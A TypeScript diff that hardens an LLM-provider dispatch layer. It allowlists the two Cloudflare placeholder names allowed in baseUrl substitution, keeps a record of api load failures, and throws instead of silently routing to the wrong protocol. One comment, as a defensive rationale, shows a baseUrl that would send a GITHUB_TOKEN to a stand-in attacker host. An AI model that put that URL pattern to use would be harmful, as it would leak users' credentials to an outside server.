@@ -42,6 +42,22 @@ type NormalizeContext = (context: any) => any;
 const BASE_URL_PLACEHOLDER = /\{([A-Z_][A-Z0-9_]*)\}/g;
 
 /**
+ * The ONLY placeholder names the seam may substitute.
+ *
+ * Restoring 0.75.5's behaviour must not turn the seam into a generic
+ * environment reader: a bare `{VAR}` scan of `process.env` would let any
+ * model's `baseUrl` — including one from a user-authored or discovered
+ * provider entry — splice an arbitrary secret into an outbound URL
+ * (`baseUrl: "https://attacker.example/{GITHUB_TOKEN}"`). Every built-in
+ * `baseUrl` that contains a placeholder uses exactly these two names, so an
+ * allowlist is full parity for every real model.
+ */
+const BASE_URL_PLACEHOLDERS: ReadonlySet<string> = new Set([
+  "CLOUDFLARE_ACCOUNT_ID",
+  "CLOUDFLARE_GATEWAY_ID",
+]);
+
+/**
  * Restore 0.75.5's baseUrl-placeholder substitution (task 1.11 finding).
  *
  * MEASURED REGRESSION, not a new feature. In 0.75.5 the api implementations
@@ -52,19 +68,23 @@ const BASE_URL_PLACEHOLDER = /\{([A-Z_][A-Z0-9_]*)\}/g;
  * >=0.85 BOTH dispatch paths leave the placeholder unresolved and the request
  * goes to a literal `{CLOUDFLARE_ACCOUNT_ID}` URL.
  *
- * Substituting here restores the old semantics exactly: caller-supplied `env`
- * first, then ambient `process.env`. A model with no placeholder is returned
- * by IDENTITY, so every non-Cloudflare provider is untouched. An unresolvable
- * placeholder is left verbatim rather than throwing — dispatch stays the
- * caller's decision, and the upstream error names the URL.
+ * Substituting here restores the old semantics: caller-supplied `env` first,
+ * then ambient `process.env`, for ALLOWLISTED names only. A model with no
+ * placeholder is returned by IDENTITY, and an unresolvable placeholder is left
+ * verbatim rather than throwing — dispatch stays the caller's decision, and
+ * the upstream error names the URL.
  */
 function resolveBaseUrlPlaceholders(model: any, env?: Record<string, string>): any {
   const baseUrl: unknown = model?.baseUrl;
   if (typeof baseUrl !== "string" || !baseUrl.includes("{")) return model;
-  const resolved = baseUrl.replace(
-    BASE_URL_PLACEHOLDER,
-    (match, name: string) => env?.[name] ?? process.env[name] ?? match,
-  );
+  const resolved = baseUrl.replace(BASE_URL_PLACEHOLDER, (match, name: string) => {
+    if (!BASE_URL_PLACEHOLDERS.has(name)) return match;
+    // An EMPTY value is not a substitution: `{VAR}` → "" yields a malformed
+    // URL (`v1///compat`) that fails somewhere unrelated. Keep the placeholder
+    // so the upstream error still names it.
+    const value = env?.[name] ?? process.env[name];
+    return typeof value === "string" && value ? value : match;
+  });
   return resolved === baseUrl ? model : { ...model, baseUrl: resolved };
 }
 
@@ -114,25 +134,46 @@ export async function buildFactorySurface(deps: FactorySurfaceDeps): Promise<PiA
 
   // ── memoized lazy api implementations ───────────────────────────────────
   const apiCache = new Map<string, ProviderStreams>();
+  /** Why a table-mapped api could not be materialized. Diagnostics only. */
+  const apiLoadErrors = new Map<string, string>();
   const loadApi = async (api: string): Promise<ProviderStreams | undefined> => {
     const cached = apiCache.get(api);
     if (cached) return cached;
     const entry = API_LAZY_TABLE[api];
     if (!entry) return undefined;
     const path = derivePiAiSubpath(resolvedPath, entry.module);
-    if (!deps.exists(path)) return undefined;
-    const loaded = (await deps.importPath(path)) as Record<string, any>;
-    const factory = loaded[entry.exportName];
-    if (typeof factory !== "function") return undefined;
-    const streams = factory() as ProviderStreams;
-    if (!streams || typeof streams.streamSimple !== "function") return undefined;
-    apiCache.set(api, streams);
-    return streams;
+    if (!deps.exists(path)) {
+      apiLoadErrors.set(api, `its lazy module is absent at "${path}"`);
+      return undefined;
+    }
+    try {
+      const loaded = (await deps.importPath(path)) as Record<string, any>;
+      const factory = loaded[entry.exportName];
+      if (typeof factory !== "function") {
+        apiLoadErrors.set(api, `"${path}" exports no "${entry.exportName}" factory`);
+        return undefined;
+      }
+      const streams = factory() as ProviderStreams;
+      if (!streams || typeof streams.streamSimple !== "function") {
+        apiLoadErrors.set(api, `"${entry.exportName}"() yielded no streamSimple`);
+        return undefined;
+      }
+      apiCache.set(api, streams);
+      return streams;
+    } catch (err) {
+      // RECORDED, never swallowed: a mapped api that failed to load must
+      // surface as a diagnosable dispatch error, not as a fallback to a
+      // DIFFERENT api. See the dispatch comment below.
+      apiLoadErrors.set(api, (err as Error).message);
+      return undefined;
+    }
   };
 
-  // Warm every mapped api up front so dispatch stays synchronous-ish and a
-  // broken table surfaces at construction, not on the first user request.
-  await Promise.all(Object.keys(API_LAZY_TABLE).map((api) => loadApi(api).catch(() => undefined)));
+  // Warm every mapped api up front so a broken table surfaces at construction
+  // rather than on the first user request. Best-effort by design: one absent api
+  // module must not 503 the whole registry, so the reason is retained above for
+  // dispatch-time diagnosis instead.
+  await Promise.all(Object.keys(API_LAZY_TABLE).map((api) => loadApi(api)));
 
   return {
     // Still invoked by the InternalRegistry constructor; a no-op on ≥0.85
@@ -146,7 +187,15 @@ export async function buildFactorySurface(deps: FactorySurfaceDeps): Promise<PiA
     registerApiProvider: () => {},
     unregisterApiProviders: () => {},
     streamSimple: (model: any, context: any, options?: any) =>
-      dispatchStream({ model, context, options, models, normalizeContext, apiCache }),
+      dispatchStream({
+        model,
+        context,
+        options,
+        models,
+        normalizeContext,
+        apiCache,
+        apiLoadErrors,
+      }),
   };
 }
 
@@ -174,13 +223,22 @@ async function resolveNormalizeContext(
 }
 
 /**
- * API-FIRST dispatch (design D3).
+ * API-FIRST dispatch (design D3), and API-ONLY when the model names an api.
  *
  * `InternalRegistry` deliberately retains a custom model authored under a
- * built-in provider name. Resolving by PROVIDER first sends such a model into
- * the built-in `Provider`, whose single-api form ignores `model.api` entirely
- * and streams it through the wrong api. 0.75.5 dispatched purely on
- * `model.api`; api-first preserves that.
+ * built-in provider name, and 0.75.5 dispatched purely on `model.api`. Falling
+ * back to the built-in PROVIDER when the api is unmapped or failed to load is
+ * NOT a safe degradation, because `createProvider`'s single-api form ignores
+ * `model.api` entirely:
+ *
+ *     const apiFor = (model) => single ?? byApi?.[model.api];
+ *
+ * `cloudflare-workers-ai` is exactly such a provider, so a custom model under
+ * it declaring `api: "anthropic-messages"` would be streamed through the
+ * OpenAI-completions api — silently the WRONG protocol, where 0.75.5 threw.
+ * An unmapped api is therefore a DISPATCH ERROR naming the api and the model,
+ * carrying no credential material. The provider is consulted only when the
+ * model names no api at all (no discriminator to route on).
  */
 function dispatchStream(args: {
   model: any;
@@ -189,25 +247,36 @@ function dispatchStream(args: {
   models: BuiltinModels;
   normalizeContext: NormalizeContext;
   apiCache: Map<string, ProviderStreams>;
+  apiLoadErrors: Map<string, string>;
 }): AsyncIterable<any> {
-  const { model, context, options, models, normalizeContext, apiCache } = args;
+  const { model, context, options, models, normalizeContext, apiCache, apiLoadErrors } = args;
   const transcript = normalizeContext(context);
 
-  const streams =
-    (model?.api ? apiCache.get(model.api) : undefined) ??
-    (model?.provider ? models.getProvider(model.provider) : undefined);
+  const provider = String(model?.provider);
+  const modelId = String(model?.id);
+  const api = typeof model?.api === "string" && model.api ? model.api : undefined;
+
+  let streams: ProviderStreams | undefined;
+  if (api) {
+    streams = apiCache.get(api);
+    if (!streams) {
+      const detail = apiLoadErrors.get(api);
+      throw new Error(
+        `pi-ai factory adaptation: no api implementation available for api "${api}" ` +
+          `(model "${provider}/${modelId}")${detail ? ` — ${detail}` : ""}`,
+      );
+    }
+  } else {
+    streams = provider ? models.getProvider(provider) : undefined;
+    if (!streams) {
+      throw new Error(
+        `pi-ai factory adaptation: model "${provider}/${modelId}" names no api and ` +
+          `provider "${provider}" is not a built-in provider`,
+      );
+    }
+  }
 
   const dispatchModel = resolveBaseUrlPlaceholders(model, options?.env);
-
-  if (!streams) {
-    // Names the api AND the model, and carries NO credential material —
-    // `options` is never interpolated into this message.
-    throw new Error(
-      `pi-ai factory adaptation: no api implementation for api "${String(model?.api)}" ` +
-        `(model "${String(model?.provider)}/${String(model?.id)}") and provider ` +
-        `"${String(model?.provider)}" is not a built-in provider`,
-    );
-  }
 
   // Caller options pass through WHOLE (signal, env, maxTokens, …) so abort
   // propagation and provider-env handling are not silently dropped; the
